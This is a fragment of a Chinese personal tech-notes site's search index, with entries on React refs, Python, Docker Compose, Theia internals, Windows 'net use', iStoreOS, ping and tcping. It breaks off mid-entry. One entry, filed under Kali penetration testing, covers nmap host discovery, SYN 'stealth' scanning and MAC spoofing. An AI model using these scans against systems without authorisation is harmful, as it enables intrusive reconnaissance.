MutableRefObject 是一个较新的 ref 类型，适用于函数组件和 React Hooks。 如果你在函数组件中使用 useRef() 创建 ref，那么你得到的是 MutableRefObject 类型的对象。 但是，类组件中的 ref 应该是 LegacyRef 类型。 这个时候需要将其转换一下, 比如: import {SelectComponent, SelectComponentProps} from \"@theia/core/lib/browser/widgets/select-component\" import * as React from \"react\"; const ForwardedChildComponent = React.forwardRef((props: SelectComponentProps, ref) => { return <SelectComponent {...props} ref={ref as React.RefObject<SelectComponent>} />; });","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-Ref-type-does-not-match.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Ref-type-does-not-match.html"},{"title":"list","text":"index()方法 检测 字符串 中是否包含子字符串 str，并返回索引值； 从 列表 中找出某个值第一个匹配项的索引位置。 list 求交集并集差集 不建议的: # 假设有两个集合 a,b # 交集 [val for val in a if val in b] # 并集 list(set(a+b)) # 差集 [val for val in b if val not in a] # b中有而a中没有的 建议的高效的: # 假设有两个集合 a,b # 交集 list(set(a).intersection(set(b))) # 并集 list(set(a).union(set(b))) # 差集 list(set(b).difference(set(a))) # b中有而a中没有的 见 /docs/后端/python/内置函数/set 求其中某值的个数 使用 count, 如: In [23]: [1, 2, 3].count(3) Out[23]: 1","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-list.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-list.html"},{"title":"zip","text":"注解 相似的函数见 /docs/后端/python/python标准库/itertools 的 zip_longest <Python_zip_longest> zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。 zip 方法在 Python 2 和 Python 3 中的不同： 在 Python 3.x 中为了减少内存，zip() 返回的是一个对象。如需展示列表，需手动 list() 转换。 如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表: >>> a = [1,2,3] >>> b = [4,5,6] >>> c = [4,5,6,7,8] >>> zipped = zip(a,b) # 返回一个对象 >>> zipped <zip object at 0x103abc288> >>> list(zipped) # list() 转换为列表 [(1, 4), (2, 5), (3, 6)] >>> list(zip(a,c)) # 元素个数与最短的列表一致 [(1, 4), (2, 5), (3, 6)] >>> a1, a2 = zip(*zip(a,b)) # 与 zip 相反，zip(*) 可理解为解压，返回二维矩阵式 >>> list(a1) [1, 2, 3] >>> list(a2) [4, 5, 6] >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-zip.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-zip.html"},{"title":"Docker Compose","text":"简介 Compose 是用于定义和运行多容器 Docker 应用程序的工具。 通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。 然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。 Compose 使用的三个步骤： 使用 Dockerfile 定义应用程序的环境。 使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。 最后，执行 docker-compose up 命令来启动并运行整个应用程序。 如: # yaml 配置实例 version: '3' services: web: build: . ports: - \"5000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} 安装 可以直接去 github 下载: https://github.com/docker/compose/releases 其实现在, 如果是桌面端, 比如MacOS, 安装的 docker 图形界面就自带 docker-compose: ll /usr/local/bin/docker-compose lrwxr-xr-x@ 1 yanque admin 62B Dec 6 2022 /usr/local/bin/docker-compose -> /Applications/Docker.app/Contents/Resources/bin/docker-compose 准备 创建一个简单的 flask 应用: $ mkdir composetest $ cd composetest 在测试目录中创建一个名为 app.py 的文件，并复制粘贴以下内容: import time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host='redis', port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr('hits') except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route('/') def hello(): count = get_hit_count() return 'Hello World! I have been seen {} times.\\n'.format(count) 在此示例中，redis 是应用程序网络上的 redis 容器的主机名，该主机使用的端口为 6379。 在 composetest 目录中创建另一个名为 requirements.txt 的文件，内容如下: flask redis 创建 dockerfile 说明见 /docs/容器与集群/docker/dockerfile编写 当前测试内容: FROM python:3.7-alpine WORKDIR /code ENV FLASK_APP app.py ENV FLASK_RUN_HOST 0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers COPY requirements.txt requirements.txt RUN pip install -r requirements.txt COPY . . CMD [\"flask\", \"run\"] 解释 FROM python:3.7-alpine: 从 Python 3.7 映像开始构建镜像。 WORKDIR /code: 将工作目录设置为 /code。 ENV FLASK_APP app.py ENV FLASK_RUN_HOST 0.0.0.0 设置 flask 命令使用的环境变量。 RUN apk add --no-cache gcc musl-dev linux-headers: 安装 gcc，以便诸如 MarkupSafe 和 SQLAlchemy 之类的 Python 包可以编译加速。 COPY requirements.txt requirements.txt RUN pip install -r requirements.txt 复制 requirements.txt 并安装 Python 依赖项。 COPY . .: 将 . 项目中的当前目录复制到 . 镜像中的工作目录。 CMD [\"flask\", \"run\"]: 容器提供默认的执行命令为：flask run。 创建 docker-compose.yml 在测试目录中创建一个名为 docker-compose.yml 的文件，然后粘贴以下内容: # yaml 配置 version: '3' services: web: build: . ports: - \"5000:5000\" redis: image: \"redis:alpine\" 该 Compose 文件定义了两个服务：web 和 redis。 web：该 web 服务使用从 Dockerfile 当前目录中构建的镜像。然后，它将容器和主机绑定到暴露的端口 5000。此示例服务使用 Flask Web 服务器的默认端口 5000 。 redis：该 redis 服务使用 Docker Hub 的公共 Redis 映像。 使用 Compose 命令构建和运行您的应用 在测试目录中，执行以下命令来启动应用程序: docker-compose up 如果你想在后台执行该服务可以加上 -d 参数: docker-compose up -d yml 配置指令参考 version 指定本 yml 依从的 compose 哪个版本制定的。 build 指定为构建镜像上下文路径： 例如 webapp 服务，指定为从上下文路径 ./dir/Dockerfile 所构建的镜像: version: \"3.7\" services: webapp: build: ./dir 或者，作为具有在上下文指定的路径的对象，以及可选的 Dockerfile 和 args: version: \"3.7\" services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 labels: - \"com.example.description=Accounting webapp\" - \"com.example.department=Finance\" - \"com.example.label-with-empty-value\" target: prod context：上下文路径。 dockerfile：指定构建镜像的 Dockerfile 文件名。 args：添加构建参数，这是只能在构建过程中访问的环境变量。 labels：设置构建镜像的标签。 target：多层构建，可以指定构建哪一层。 cap_add，cap_drop 添加或删除容器拥有的宿主机的内核功能。 cap_add: ALL # 开启全部权限 cap_drop: SYS_PTRACE # 关闭 ptrace权限 cgroup_parent 为容器指定父 cgroup 组，意味着将继承该组的资源限制: cgroup_parent: m-executor-abcd command 覆盖容器启动的默认命令: command: [\"bundle\", \"exec\", \"thin\", \"-p\", \"3000\"] container_name 指定自定义容器名称，而不是生成的默认名称: container_name: my-web-container depends_on 设置依赖关系。 docker-compose up ：以依赖性顺序启动服务。在以下示例中，先启动 db 和 redis ，才会启动 web。 docker-compose up SERVICE ：自动包含 SERVICE 的依赖项。在以下示例中，docker-compose up web 还将创建并启动 db 和 redis。 docker-compose stop ：按依赖关系顺序停止服务。在以下示例中，web 在 db 和 redis 之前停止。 如: version: \"3.7\" services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres 注意：web 服务不会等待 redis db 完全启动 之后才启动。 deploy 指定与服务的部署和运行有关的配置。只在 swarm 模式下才会有用: version: \"3.7\" services: redis: image: redis:alpine deploy: mode：replicated replicas: 6 endpoint_mode: dnsrr labels: description: \"This redis service label\" resources: limits: cpus: '0.50' memory: 50M reservations: cpus: '0.25' memory: 20M restart_policy: condition: on-failure delay: 5s max_attempts: 3 window: 120s 可选参数 endpoint_mode 访问集群服务的方式: endpoint_mode: vip # Docker 集群服务一个对外的虚拟 ip。所有的请求都会通过这个虚拟 ip 到达集群服务内部的机器。 endpoint_mode: dnsrr # DNS 轮询（DNSRR）。所有的请求会自动轮询获取到集群 ip 列表中的一个 ip 地址。 labels 在服务上设置标签。可以用容器上的 labels（跟 deploy 同级的配置） 覆盖 deploy 下的 labels。 mode：指定服务提供的模式。 replicated：复制服务，复制指定服务到集群的机器上。 global：全局服务，服务将部署至集群的每个节点。 图解：下图中黄色的方块是 replicated 模式的运行情况，灰色方块是 global 模式的运行情况。 replicas mode 为 replicated 时，需要使用此参数配置具体运行的节点数量。 resources 配置服务器资源使用的限制，例如上例子，配置 redis 集群运行需要的 cpu 的百分比 和 内存的占用。避免占用资源过高出现异常。 restart_policy 配置如何在退出容器时重新启动容器。 condition：可选 none，on-failure 或者 any（默认值：any）。 delay：设置多久之后重启（默认值：0）。 max_attempts：尝试重新启动容器的次数，超出次数，则不再尝试（默认值：一直重试）。 window：设置容器重启超时时间（默认值：0）。 rollback_config 配置在更新失败的情况下应如何回滚服务。 parallelism：一次要回滚的容器数。如果设置为0，则所有容器将同时回滚。 delay：每个容器组回滚之间等待的时间（默认为0s）。 failure_action：如果回滚失败，该怎么办。其中一个 continue 或者 pause（默认pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在回滚期间可以容忍的故障率（默认为0）。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认 stop-first ）。 update_config 配置应如何更新服务，对于配置滚动更新很有用。 parallelism：一次更新的容器数。 delay：在更新一组容器之间等待的时间。 failure_action：如果更新失败，该怎么办。其中一个 continue，rollback 或者pause （默认：pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在更新过程中可以容忍的故障率。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认stop-first）。 注：仅支持 V3.4 及更高版本。 devices 指定设备映射列表: devices: - \"/dev/ttyUSB0:/dev/ttyUSB0\" dns 自定义 DNS 服务器，可以是单个值或列表的多个值: dns: 8.8.8.8 dns: - 8.8.8.8 - 9.9.9.9 dns_search 自定义 DNS 搜索域。可以是单个值或列表: dns_search: example.com dns_search: - dc1.example.com - dc2.example.com entrypoint 覆盖容器默认的 entrypoint: entrypoint: /code/entrypoint.sh 也可以是以下格式: entrypoint: - php - -d - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so - -d - memory_limit=-1 - vendor/bin/phpunit env_file 从文件添加环境变量。可以是单个值或列表的多个值: env_file: .env 也可以是列表格式: env_file: - ./common.env - ./apps/web.env - /opt/secrets.env environment 添加环境变量。您可以使用数组或字典、任何布尔值， 布尔值需要用引号引起来，以确保 YML 解析器不会将其转换为 True 或 False: environment: RACK_ENV: development SHOW: 'true' expose 暴露端口，但不映射到宿主机，只被连接的服务访问。 仅可以指定内部端口为参数: expose: - \"3000\" - \"8000\" extra_hosts 添加主机名映射。类似 docker client --add-host: extra_hosts: - \"somehost:162.242.195.82\" - \"otherhost:50.31.209.229\" 以上会在此服务的内部容器中 /etc/hosts 创建一个具有 ip 地址和主机名的映射关系: 162.242.195.82 somehost 50.31.209.229 otherhost healthcheck:: 用于检测 docker 服务是否健康运行: healthcheck: test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] # 设置检测程序 interval: 1m30s # 设置检测间隔 timeout: 10s # 设置检测超时时间 retries: 3 # 设置重试次数 start_period: 40s # 启动后，多少秒开始启动检测程序 image 指定容器运行的镜像。以下格式都可以: image: redis image: ubuntu:14.04 image: tutum/influxdb image: example-registry.com:4000/postgresql image: a4bc65fd # 镜像id logging 服务的日志记录配置 driver 指定服务容器的日志记录驱动程序，默认值为json-file。有以下三个选项 driver: \"json-file\" driver: \"syslog\" driver: \"none\" 仅在 json-file 驱动程序下，可以使用以下参数，限制日志得数量和大小: logging: driver: json-file options: max-size: \"200k\" # 单个文件大小为200k max-file: \"10\" # 最多10个文件 当达到文件限制上限，会自动删除旧得文件。 syslog 驱动程序下，可以使用 syslog-address 指定日志接收地址: logging: driver: syslog options: syslog-address: \"tcp://192.168.0.42:123\" network_mode 设置网络模式: network_mode: \"bridge\" network_mode: \"host\" network_mode: \"none\" network_mode: \"service:[service name]\" network_mode: \"container:[container name/id]\" networks 配置容器连接的网络，引用顶级 networks 下的条目 services: some-service: networks: some-network: aliases: - alias1 other-network: aliases: - alias2 networks: some-network: # Use a custom driver driver: custom-driver-1 other-network: # Use a custom driver which takes special options driver: custom-driver-2 aliases ：同一网络上的其他容器可以使用服务名称或此别名来连接到对应容器的服务。 restart no：是默认的重启策略，在任何情况下都不会重启容器。 always：容器总是重新启动。 on-failure：在容器非正常退出时（退出状态非0），才会重启容器。 unless-stopped：在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器 如: restart: \"no\" restart: always restart: on-failure restart: unless-stopped 注：swarm 集群模式，请改用 restart_policy。 secrets 存储敏感数据，例如密码: version: \"3.1\" services: mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/my_secret secrets: - my_secret secrets: my_secret: file: ./my_secret.txt security_opt 修改容器默认的 schema 标签: security-opt： - label:user:USER # 设置容器的用户标签 - label:role:ROLE # 设置容器的角色标签 - label:type:TYPE # 设置容器的安全策略标签 - label:level:LEVEL # 设置容器的安全等级标签 stop_grace_period 指定在容器无法处理 SIGTERM (或者任何 stop_signal 的信号)，等待多久后发送 SIGKILL 信号关闭容器: stop_grace_period: 1s # 等待 1 秒 stop_grace_period: 1m30s # 等待 1 分 30 秒 默认的等待时间是 10 秒。 stop_signal 设置停止容器的替代信号。默认情况下使用 SIGTERM 。 以下示例，使用 SIGUSR1 替代信号 SIGTERM 来停止容器: stop_signal: SIGUSR1 sysctls 设置容器中的内核参数，可以使用数组或字典格式: sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0 sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 tmpfs 在容器内安装一个临时文件系统。可以是单个值或列表的多个值: tmpfs: /run tmpfs: - /run - /tmp ulimits 覆盖容器默认的 ulimit: ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes 将主机的数据卷或着文件挂载到容器里: version: \"3.7\" services: db: image: postgres:latest volumes: - \"/localhost/postgres.sock:/var/run/postgres/postgres.sock\" - \"/localhost/data:/var/lib/postgresql/data\" 参考: 菜鸟教程","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-compose.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-compose.html"},{"title":"资源管理器工作区按钮","text":"node_modules/@theia/workspace/src/browser/workspace-commands.ts 的 WorkspaceCommands 基本上定义完了 触发定义在 WorkspaceCommandContribution","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html"},{"title":"工具栏更多","text":"资源管理器的工具栏的更多 node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx 的 TabBarToolbar 下的 registerMoreToolbarItem : // More (...) toolbar items. this.registerMoreToolbarItem({ id: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id, command: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id, tooltip: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.label, group: NavigatorMoreToolbarGroups.TOOLS, }); this.registerMoreToolbarItem({ id: WorkspaceCommands.ADD_FOLDER.id, command: WorkspaceCommands.ADD_FOLDER.id, tooltip: WorkspaceCommands.ADD_FOLDER.label, group: NavigatorMoreToolbarGroups.WORKSPACE, }); 那三个点实现在 node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx 的 TabBarToolbar 下 renderMore : protected renderMore(): React.ReactNode { return !!this.more.size && <div key='__more__' className={TabBarToolbar.Styles.TAB_BAR_TOOLBAR_ITEM + ' enabled'}> <div id='__more__' className={codicon('ellipsis', true)} onClick={this.showMoreContextMenu} title={nls.localizeByDefault('More Actions...')} /> </div>; }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html"},{"title":"Python中进制","text":"关键字 Python进制, python进制, 进制转换, 获取进制数 一般有三种: bin 二进制 oct 八进制 hex 十六进制 其中 八进制 0 开头 十六进制 0x 开头 转换 n进制转换为十进制，假设需要转换的位str的数字字符串: # str=001234; n=8 print int(str, n) 进制转换 python中约定了以为 0b, 0o, 0x开头, b, o, x 的含义分别是: b - 二进制,Binary o - 八进制,Octal x - 十六进制,Hexadecimal 在Python中对应方法为: 二进制: bin() 八进制: oct() 十六进制: hex() 转回十进制: int('0x16', 16) 举个例子: 0b10 # 二进制 10, 相当于十进制 2 0o10 # 八进制 10, 相当于十进制 8 0x10 # 十六进制 10, 相当于十进制 16 例: In [6]: '十进制', 22 Out[6]: ('十进制', 22) In [7]: '二进制', bin(22) Out[7]: ('二进制', '0b10110') In [8]: '八进制', oct(22) Out[8]: ('八进制', '0o26') In [9]: '十六进制', hex(22) Out[9]: ('十六进制', '0x16') In [11]: int('0x16', 16), '十六进制转十进制' Out[11]: (22, '十六进制转十进制')","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-midfielder.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-midfielder.html"},{"title":"nmap","text":"Network Mapper, Linux下的网络扫描和嗅探工具包(比如IP/端口扫描) 用法: nmap [Scan Type(s)] [Options] {target specification} target可以是单一 IP, 或主机名，或域名，或子网 选项参数 --interactive 打开交互模式 -v 输出详细信息 -O 尝试识别远程操作系统 -s S TCP SYN 扫描 (又称半开放,或隐身扫描) -s V 打开系统版本检测 -A 同时打开操作系统指纹和版本检测 -s n , -s P 不扫描端口, 发送imcp和一个TCP报文到80端口 其他: -P0 允许你关闭 ICMP pings. -Pn 无ping, 跳过主机发现阶段，把每个都IP当成存活主机 -P0 <协议号列表> IP 协议 ping, -sT TCP connect()扫描 -sU UDP 扫描 示例 扫描局域网主机: nmap -sP 192.168.1.0/24 扫描主机端口: nmap -sT 192.168.1.101 # 貌似其他非Kali机器自行安装的得 nmap -sT -Pn 192.168.1.101 匿名扫描: nmap -sS 192.168.1.101 ┌── ( yanque㉿kali ) - [ ~ ] └─$ nmap 192 .168.179.129 Starting Nmap 7 .93 ( https://nmap.org ) at 2023 -01-02 17 :24 CST Nmap scan report for 192 .168.179.129 Host is up ( 0 .000042s latency ) . Not shown: 999 closed tcp ports ( conn-refused ) PORT STATE SERVICE 22 /tcp open ssh Nmap done : 1 IP address ( 1 host up ) scanned in 0 .09 seconds ┌── ( yanque㉿kali ) - [ ~ ] └─$ 查看 192.168.179.129 的 22 端口状态: ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ nmap -p22 192.168.179.129 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 06:48 UTC Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds 伪装MAC地址11:11:11:11:11:11 ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ nmap --spoof-mac 11:11:11:11:11:11 192.168.100.1 -Pn -p 80 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:35 UTC Spoofing MAC address 11:11:11:11:11:11 (Private) You have specified some options that require raw socket access. These options will not be honored without the necessary privileges. Nmap scan report for 192.168.100.1 Host is up. PORT STATE SERVICE 80/tcp filtered http Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html"},{"title":"编辑器打开并滑动","text":"主要基于的情况: 代码跳转到指定文件的指定位置 入口位置: node_modules/@theia/monaco-editor-core/src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts 下的 SymbolNavigationAction 类 runEditorCommand , 关键打开实际触发的 _openReference 实例方法, 关键代码: const targetEditor = await editorService.openCodeEditor({ resource: reference.uri, options: { selection: Range.collapseToStart(range), selectionRevealType: TextEditorSelectionRevealType.NearTopIfOutsideViewport, selectionSource: TextEditorSelectionSource.JUMP } }, editor, sideBySide); 这里调用 editorService.openCodeEditor , 定义在 node_modules/@theia/monaco/src/browser/monaco-editor-service.ts 下的 MonacoEditorService 服务, openCodeEditor 关键代码: override async openCodeEditor(input: IResourceEditorInput, source: ICodeEditor | null, sideBySide?: boolean): Promise<ICodeEditor | null> { const uri = new URI(input.resource.toString()); const openerOptions = this.createEditorOpenerOptions(input, source, sideBySide); const widget = await open(this.openerService, uri, openerOptions); ... } 主要是 open , 定义在 node_modules/@theia/core/src/browser/opener-service.ts export async function open(openerService: OpenerService, uri: URI, options?: OpenerOptions): Promise<object | undefined> { const opener = await openerService.getOpener(uri, options); return opener.open(uri, options); } 这里又回转到 node_modules/@theia/editor/src/browser/editor-manager.ts 下 EditorManager 服务的: override open(uri: URI, options?: EditorOpenerOptions): Promise<EditorWidget> { ... return super.open(uri, { counter, ...options }); ... 这里super触发的是 node_modules/@theia/core/src/browser/widget-open-handler.ts 下的 WidgetOpenHandler 服务的 async open(uri: URI, options?: WidgetOpenerOptions): Promise<W> { const widget = await this.getOrCreateWidget(uri, options); await this.doOpen(widget, options); return widget; } 但是实际上是被 node_modules/@theia/editor-preview/src/browser/editor-preview-manager.ts 重写的 EditorPreviewManager 触发 tryGetPendingWidget : protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined { return super.tryGetPendingWidget(uri, { ...options, preview: true }) ?? super.tryGetPendingWidget(uri, { ...options, preview: false }); } 再看super的定义: protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined { const editorPromise = super.tryGetPendingWidget(uri, options); if (editorPromise) { // Reveal selection before attachment to manage nav stack. (https://github.com/eclipse-theia/theia/issues/8955) if (!(editorPromise instanceof Widget)) { editorPromise.then(editor => this.revealSelection(editor, options, uri)); } else { this.revealSelection(editorPromise, options); } } return editorPromise; } editorPromise 那一步其实就可以算页面已经在后台创建好了, 只是还没显示出来而已. 接着重点就是调用 revealSelection 来将光标移动道指定的位置, 关键调用代码: if (inputSelection) { const editor = widget.editor; const selection = this.getSelection(widget, inputSelection); if (Position.is(selection)) { editor.cursor = selection; editor.revealPosition(selection); } else if (Range.is(selection)) { editor.cursor = selection.end; editor.selection = selection; editor.revealRange(selection); } } 代码跳转触发的是 revealRange , 这期间简单的调用打断点向下看就是了, 大致顺序: node_modules/@theia/monaco/src/browser/monaco-editor.ts 下 MonacoEditor().revealRange , 接下来以调用 revealRangeInCenter 为例 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/widget/codeEditorWidget.ts , CodeEditorWidget().revealRangeInCenter 在这个类中最终触发: this._modelData.viewModel.revealRange('api', revealHorizontal, viewRange, verticalType, scrollType); 它的 _withViewEventsCollector 会将事件放到一个集合然后统一触发. 稍微复杂的就是这个位置, 写的有点绕. 集合统一处理的位置: node_modules/@theia/monaco-editor-core/src/vs/editor/common/viewEventHandler.ts 下的 ViewEventHandler().handleEvents , 关键代码: case viewEvents.ViewEventType.ViewRevealRangeRequest: if (this.onRevealRangeRequest(e)) { shouldRender = true; } break; 这里 onRevealRangeRequest 触发的相关位置为 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/viewParts/lines/viewLines.ts 的 ViewLines().onRevealRangeRequest : const scrollTopDelta = Math.abs(this._context.viewLayout.getCurrentScrollTop() - newScrollPosition.scrollTop); const scrollType = (scrollTopDelta <= this._lineHeight ? ScrollType.Immediate : e.scrollType); this._context.viewModel.viewLayout.setScrollPosition(newScrollPosition, scrollType);","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html"},{"title":"net","text":"查看已经挂载/打开的网络地址 (指磁盘, ftp服务器啥的): net use 删除上面列举出所有挂载的磁盘/服务器: net use /delete * 删除 z 盘映射: net use z: /delete 挂载samba共享为z盘: net use z:\\\\192.168.1.1\\USB_discl /user:usernane passwd","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-net.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-net.html"},{"title":"iStoreOS","text":"一个基于 /docs/操作系统/linux/OpenWrt/index 的定制系统 官网: https://www.istoreos.com 官网文档: https://doc.linkease.com/zh/guide/istoreos/ github主页: https://github.com/istoreos 支持(源于官网) StoreOS 固件 iStoreOS 目标是提供一个人人会用的路由兼轻 NAS 系统，不管是作为路由还是 NAS，你都有相似的操作体验。 系统本身开源免费，目前系统代码开源在：Github iStoreOS iStoreOS 来源于 OpenWRT，相较于原版 OpenWRT，iStoreOS 具有以下优势： iStoreOS 提供了软件中心：iStore，尽可能解决插件之间的依赖关系，可让大家自由自在安装插件。手动安装离线包也是支持的。 iStoreOS 固件升级时会保留用户安装的插件，避免升级以后还要再安装一遍插件。 iStoreOS 官方支持的硬件都可以在线升级，无需手动下载固件升级。 iStoreOS 拥有沙箱模式。通过 U 盘进入沙箱模式，后续的软件安装更新以及系统配置都在沙箱进行。不管安装插件搞坏了系统还是配置错误导致系统故障，拔掉 U 盘就回到进沙箱前的状态。如果对当前状态满意还可以回写到非沙箱环境。沙箱模式本身也是系统扩容的最简单的方法。 救援模式，即使固件损坏，也可以进入救援模式刷机或恢复出厂设置。目前仅仅自家硬件 ARS2 支持 支持三种不同UI iStoreOS 入门极客版本 UI 是默认的 UI，目标是提供给懂点技术的入门极客爱好者，或者偷懒极客老手，核心特性： 首页提供网络向导，磁盘向导，Docker 向导等等众多向导，不管是新手还是老手，都能快速配置自己想要的东西 修复众多 OpenWRT 不人性的小问题，比如 Samba 设置独立用户名密码很麻烦，磁盘挂载等 更多首页工具好帮手，比如在线升级，各种错误检测，网口图形化配置等 其它很多常用的，比如 DDNS 配置，Docker 配置等 最标准的小白路由版本 减去了超多的复杂的眼花缭乱的功能，回归最本质的路由功能。 对于路由器硬件卖家来说，最好默认帮用户安装此版本。 安装方法 在默认的极客版本上，从软件中心，安装 iStoreX 退出重新登录，就到了小白路由器版本 轻 NAS 版本 如果你不是重度的BT下载用户，也不是重度在线看电影需要视频硬解码的用户， 那么用个软路由当NAS，是完全没问题的。毕竟网络转发跟硬盘存储不冲突。 当然，iStoreOS 也会提供给你一个纯正独立的 NAS 系统，底层也完全是 OpenWRT， 且软件中心完全互通，你懂的路由器的知识，也可以完全搬到 NAS 系统上。那么我们的 NAS 系统有哪些功能？ RAID 磁盘阵列 S.M.A.R.T 检测 个人私有网盘，借助易有云插件 实现 相册自动备份，借助易有云插件 实现 异地多设备文件同步，借助易有云插件 实现 异地组网，借助易有云插件 实现 远程域名访问，借助DDNSTO插件 实现 软件中心（当然软件中心有 NasTool、Jellyfin 影院、下载等等） 注意：目前此交互还在活跃开发中 固件下载 下载地址 https://fw.koolcenter.com/iStoreOS/ 使用方法 默认IP: http://192.168.100.1 默认密码: password 如果只有一个网口，默认的网口是 LAN； 如果大于一个网口，默认 eth0 是 WAN 口，其它都是 LAN。 如果在 LAN 口修改 IP，或者任何修改之后导致无法连接路由器，都会导致刚才的修改被回滚。 所以要修改 LAN/WAN 口 IP，可以选择强制应用，保证修改肯定生效。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Istoreos-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Istoreos-index.html"},{"title":"ping","text":"主要透过 icmp 封包 探索网络. 属于网络层的ICMP协议，只能检查 IP 的连通性或网络连接速度， 无法检测IP的端口状态。 可以测试主机之间网络的连通性 -c 数值 表示执行ping的次数 -n 不进行ip与主机名的反查，直接用ip输出（速度较快） -s 数值 发出去的 icmp 封包大小，预设为56bytes -t 数值 TTL的数值，预设是255，每经过一个节点就减一 -W 数值 等待响应对方主机的秒数 -M [do|dont] 主要在侦测网络的MTU数值大小 do 代表传送一个 DF（Dont Fragment）旗标，让封包不能重新拆包与打包 dont 代表不要传送 DF标志，表示封包可以在其他主机封包、打包 若不存在: apt-get install iputils-ping","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-flat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-flat.html"},{"title":"tcping","text":"与 /docs/操作系统/linux/linux指令/ping 和 /docs/操作系统/linux/linux指令/telnet 都不同, 是一款跨平台的基于Go的, tcp链接检查工具. 使用传输层协议，可以检测IP端口状态和查看ping 值， 即使源地址禁 ping 也可以通过 tcping 来监控服务器网络状态。 Windows下载: https://elifulkerson.com/projects/tcping.php MacOS安装: brew install tcping 注解 看了下, 貌似最开始只有win版, 不知道啥写的, 然后是后面才有人用Go根据这个写的其他平台的版本, 目前排名最高的两个: https://github.com/cloverstd/tcping # 这个更新勤点 https://github.com/pouriyajamshidi/tcping MacOS下看了下, 用的是收藏量不高的: brew info tcping ==> tcping: stable 2.1.0 (bottled), HEAD TCP connect to the given IP/port combo https://github.com/mkirchner/tcping /usr/local/Cellar/tcping/2.1.0 (5 files, 39.4KB) * Poured from bottle using the formulae.brew.sh API on 2024-03-04 at 10:07:05 From: https://github.com/Homebrew/homebrew-core/blob/HEAD/Formula/t/tcping.rb License: MIT 用法: tcping [-q] [-f <4|6>] [-t timeout_sec] [-u timeout_usec] <host> <port> 举例: ### 默认端口为80 tcping google.com ### 带上80端口 tcping google.com 80 ### 带上443端口 tcping google.com 443 ### 多个端口 tcping google.com 80 443 ### 连续的端口 tcping google.com 80-85 ### 多个连续的端口 tcping google.com 80-83 443-445 ### IPV6 地址 tcping 